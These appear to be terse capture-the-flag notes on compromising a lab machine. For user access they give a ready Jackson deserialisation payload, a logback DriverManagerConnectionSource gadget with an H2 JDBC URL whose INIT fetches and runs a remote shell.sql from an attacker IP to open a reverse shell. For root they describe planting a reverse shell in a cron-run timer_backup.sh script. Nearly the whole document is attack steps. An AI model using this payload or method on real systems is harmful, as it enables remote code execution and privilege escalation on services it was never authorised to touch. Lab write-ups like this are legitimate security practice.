FOR USER:
notice that 'jackson' sometimes appears in displayed error messages of the validate function
turns out jackson has deserialisation vulnerability which allows users to use and control arbitrary java objects

JSON INPUT:
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://<IP>:<PORT>/shell.sql'"}]
this will run a user provided sql script (SEE THIS FOLDER) to get reverse shell and user.

FOR ROOT:

notice that timer_backup.sh is owned by pericles and on the path.
pspy output will show that this script is run periodically
add reverse shell payload to timer_backup.sh for root
